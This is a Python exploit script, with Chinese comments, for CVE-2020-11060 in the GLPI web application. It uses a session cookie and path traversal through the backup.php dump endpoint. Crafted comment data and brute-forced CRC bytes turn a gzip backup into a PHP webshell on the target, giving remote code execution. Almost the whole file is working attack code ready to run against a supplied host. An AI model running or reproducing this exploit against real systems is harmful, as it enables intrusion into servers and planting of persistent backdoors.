import datetime
import random
import shutil
import time
from optparse import OptionParser

import requests
import os

a_path = './payload/a'
payload_path = './payload/payload'


def get_local_time(formats="%Y-%m-%d %H:%M:%S") -> str:
    """
    根据格式化字符，获取系统时间
    :param formats: 格式化字符
    :return: 系统时间
    """
    return time.strftime(formats, time.localtime()) + '\n'


class Logger:
    def __init__(self):
        """
        self.wire ==> 请求流量记录文件
        self.log ==> 日志文件
        self.variables ==> 变量文件
        """
        self.wire = None
        self.log = None
        self.variables = None
        self.__make_files()

    def __make_files(self) -> None:
        """
        初始化，创建 ./tmp_data文件夹，打开相应的文件
        :return: None
        """
        try:
            if os.path.exists("./tmp_data"):
                shutil.rmtree('./tmp_data')
            os.mkdir("./tmp_data", 0o755)
            self.wire = open('./tmp_data/wire', 'w')
            self.log = open('./tmp_data/log', 'w')
            self.variables = open('./tmp_data/variables', 'w')
        except Exception as e:
            print(e)
            print("[-] write file error")
            exit(-1)

    def write_log(self, content) -> None:
        """
        记录日志
        :param content: 日志信息
        :return: None
        """
        try:
            print(get_local_time() + content)
            self.log.write(get_local_time() + content + '\n\n')
        except Exception as e:
            print(e)

    def write_wire(self, **kwargs) -> None:
        """
        记录流量
        :param kwargs: 流量关键字段
        :return: None
        """
        try:
            self.wire.write(get_local_time())
            for (first, second) in kwargs.items():
                self.wire.write("\t\t{} ==> {}\n".format(first, second))
            self.wire.write("\n\n")
        except Exception as e:
            self.write_log("[-] write wire error")

    def write_response(self, res) -> str:
        """
        记录下response的日期，响应代码，响应内容
        :param res: response 对象
        :return: 文件名(str)
        """
        try:
            local_time = get_local_time("%Y%m%d%H%M%S")[:-2]
            file_name = local_time + ".html"
            # write a new response file
            f = open("./tmp_data/" + file_name, 'w')
            f.write(get_local_time() + "\t\t" + str(res.status_code) + "\n" + res.text)
            f.close()
            return file_name
        except Exception as e:
            logger.write_log("[-] write response failed")

    def __del__(self):
        """
        销毁logger，关闭文件，记录信息
        :return:
        """
        self.write_wire(status="[+] fin")
        self.write_log("[+] fin")
        self.wire.close()
        self.log.close()
        self.variables.close()


class Poc:
    def __init__(self):
        self.id: int = 0
        self.mod_time: time = None
        self.content: str = ""
        self.host: str = ""
        self.host_time: str = ""
        self.header: dict = {}
        self.proxy: dict = {}
        self.webshell_path: str = ""

    def download_backup(self, file_name):
        os.system("curl {0}/{1} > ./tmp_data/{1}".format(self.host, file_name))
        print("gzip -d")
        os.system("gzip -d ./tmp_data/{0}".format(file_name))
        time.sleep(0.1)

    def back_up(self, offset=0, file_name="001.gz", download=True):
        if os.path.exists('./tmp_data/{}'.format(file_name[:-3])):
            os.remove("./tmp_data/{}".format(file_name[:-3]))
        url = "{}/front/backup.php?dump=1&offsettable={}&fichier=../{}".format(self.host, offset, file_name)
        res = requests.get(url=url, headers=self.header)
        if download:
            self.download_backup(file_name=file_name)

    def __get_id(self, content):
        symbols = b'VALUES (\''
        id_index = content.index(symbols)
        start_index = id_index + len(symbols)
        end_index = content[start_index:].index(b"\',")
        id = content[start_index:start_index + end_index]
        self.id = int(id)

    def get_host_time(self, file_name="001"):
        try:
            f = open('./tmp_data/{}'.format(file_name), 'rb')
            contents = f.read()
            tables = contents.split(b'### Dump')
            f.close()
            i = 0
            for table in tables:
                i += 1
                if b'`glpi_wifinetworks`' in table:
                    self.__get_id(table)
                    logger.write_log('[+] id ==> {}'.format(self.id))
                    mod_time = table.strip()[-44:-25]
                    f = open('./tmp_data/glpi_wifinetworks', 'wb')
                    f.write(b"### Dump" + table)
                    f.close()
                    self.mod_time = mod_time.decode()
                    logger.write_log('[+] mod_time ==> {}'.format(self.mod_time))
                    break
        except Exception as e:
            logger.write_log('[+] exception in get_host_time ==> {}'.format(e))
            exit(-1)

    def get_poc(self, sleep_time=2):
        try:
            seq = list(range(40, 60)) + list(range(63, 92)) + list(range(93, 127))
            f = open('./tmp_data/glpi_wifinetworks', 'rb')
            content = f.read()
            f.close()
            ad_hoc_index = content.index(b"'ad-hoc','")
            begin = b"\n" + content[:ad_hoc_index] + b"'ad-hoc','"
            startTime = datetime.datetime.strptime(self.mod_time, "%Y-%m-%d %H:%M:%S")  # 把strTime转化为时间格式,后面的秒位自动补位的
            startTime2 = (startTime + datetime.timedelta(minutes=sleep_time)).strftime("%Y-%m-%d %H:%M:%S")
            end = b"','" + startTime2.encode() + content[-26:]
            logger.write_log('[+] end time ==> {}'.format(startTime2))
            length = len(begin + end) % 0x100
            padding_length = 0x12a - length - 4
            flag = True
            logger.write_log('[+] use crcChanger to get poc')
            while flag:
                random_bytes = gen(seq, 4)
                pads = b'a' * padding_length
                fill_contents = begin + pads + random_bytes + end
                file_name = './tmp_data/002.txt'
                f = open(file_name, 'wb')
                f.write(fill_contents)
                f.close()
                os.system("python3 crcChanger.py {} 904 2F3D3F3C".format(file_name))
                time.sleep(0.05)
                f = open(file_name, 'rb')
                contents = f.read()
                content1 = contents[904:908]
                f.close()
                signal = True
                for c in content1:
                    if c not in seq:
                        signal = False
                # success
                if signal:
                    # write to ./payload/a
                    print("crc success")
                    logger.write_log('[+] crc get successfully')
                    f = open('./payload/a', 'wb')
                    content = content1 + b'a' * (padding_length - 4) + random_bytes
                    logger.write_log('[+] payload1 is ==> {}'.format(content))
                    f.write(content)
                    f.close()
                    flag = False
        except Exception as e:
            logger.write_log('[+] exception in get_poc ==> {}'.format(e))
            exit(-1)

    def __get_token(self) -> str:
        """
        获取 _glpi_csrf_token
        :return: token(str)
        """
        # got csrf token
        url1 = "{}/front/wifinetwork.form.php?id=1".format(self.host)
        res = requests.get(url1, headers=self.header)
        if "csrf_token" in res.text:
            index = res.text.index("_glpi_csrf_token")
            token = res.text[index + 25:index + 57]
            return token
        else:
            return None

    def edit_data(self, file_name=None, string=None) -> str:
        try:
            if file_name is not None:
                f = open(file_name, 'rb')
                content = f.readline()
                f.close()
            elif string is not None:
                content = string
            logger.write_log('[+] edit_data ==> {}'.format(content))
            token = self.__get_token()
            head = {
                'Cookie': self.header['Cookie'],
                "Referer": "{}/front/wifinetwork.form.php?id=1".format(self.host),
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjnl6B8tkyldybnrr",
            }

            data = rb'''
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="entities_id"

0
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="is_recursive"

0
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="name"

PoC
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="comment"

''' + content + rb'''
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="essid"

RCE
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="mode"

ad-hoc
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="update"

save
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="_read_date_mod"

2020-04-21 10:55:09
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="id"

''' + str(self.id).encode() + b'''
------WebKitFormBoundaryjnl6B8tkyldybnrr
Content-Disposition: form-data; name="_glpi_csrf_token"

''' + token.encode() + rb'''
------WebKitFormBoundaryjnl6B8tkyldybnrr--'''

            url = '{}/front/wifinetwork.form.php'.format(self.host)
            res = requests.post(url=url, data=data, headers=head, proxies=self.proxy)
            logger.write_log('[+] request for ==> {}'.format(url))
            logger.write_wire(url=url, headers=head, proxies=self.proxy, data=data)
            logger.write_response(res=res)
            global local_time
            local_time = time.time()
            if res.status_code != 200:
                pass
        except Exception as e:
            logger.write_log('[-] exception in edit_data ==> {}'.format(e))
            exit(-1)


class Parser:
    def __init__(self):
        parser = OptionParser()
        parser.add_option('--host', '-H', type='string', dest='host', help='the host to exploit CVE-2020-11060')
        parser.add_option('--cookie', '-C', type='string', dest='cookie', help='the cookie of the host')
        parser.add_option('--proxy', '-P', type='string', dest='proxy', help='set the proxy')
        parser.add_option('--webshell', '-W', type='string', dest='webshell_path', help='the name of webshell')
        (option, args) = parser.parse_args()
        self.__set_args(option=option)

    def __set_args(self, option):
        try:
            self.__set_host(option.host)
            self.__set_cookie(option.cookie)
            self.__set_proxy(option.proxy)
            self.__set_webshell(option.webshell_path)
        except Exception as e:
            logger.write_log('[+] exception in __set_args ==> {}'.format(e))
            exit(-1)

    def __set_webshell(self, webshell_path):
        if webshell_path is not None:
            poc.webshell_path = webshell_path
        else:
            logger.write_log('[-] please input webshell path (use --webshell or -W)')
            exit(-1)

    def __set_host(self, host):
        if host is not None:
            poc.host = host
        else:
            logger.write_log('[-] you must give a host to exploit (use --host or -H)')
            exit(-1)

    def __set_cookie(self, cookie):
        if cookie is not None:
            poc.header['Cookie'] = cookie
        else:
            logger.write_log('[-] you must give the cookie (use --cookie or -C)')
            exit(-1)

    def __set_proxy(self, proxy):
        if proxy is not None:
            poc.proxy['http'] = proxy
        else:
            poc.proxy = None


def time2int(times: str) -> int:
    times = times.split(':')
    return int(times[0]) * 60 + int(times[1])


def gen(seq, n):
    rand_bytes = b''
    for i in range(n):
        rand_bytes = rand_bytes + chr(random.choice(seq)).encode('utf8', 'surrogatepass')
    return rand_bytes


poc = Poc()
logger = Logger()
Parser()
local_time = 0


def main():
    logger.write_log('[+] start poc ......')
    offset = 312
    # random bytes list
    seq = b"abcdefghijklmnopqrstuvwxyz"
    random_byte = gen(seq, 5)
    logger.write_log('[+] start get id and time....')

    filename = gen(seq, 4).decode()
    poc.back_up(offset, file_name="{}.gz".format(filename))
    poc.get_host_time(file_name=filename)

    filename = gen(seq, 4).decode()
    poc.edit_data(string=random_byte)
    logger.write_log('[+] write it to random bytes ==> {}'.format(random_byte))
    poc.back_up(offset, file_name='{}.gz'.format(filename))
    poc.get_host_time(file_name=filename)
    logger.write_log('[+] get time success, time is ==> {}'.format(local_time))
    poc.get_poc(1)
    new_time = time.time()
    while new_time - local_time < (1 * 59.95):
        time.sleep(0.01)
        new_time = time.time()

    poc.edit_data(file_name='./payload/a')
    logger.write_log('[+] edit data by time{}'.format(new_time))
    poc.back_up(offset=offset, file_name=poc.webshell_path, download=False)
    logger.write_log('[+] back up <?=/* to 002.php')
    poc.edit_data('./payload/payload')
    logger.write_log('[+] write payload to 002.php')
    poc.back_up(offset=offset, file_name=poc.webshell_path)
    logger.write_log('[+] poc ends')


if __name__ == '__main__':
    main()
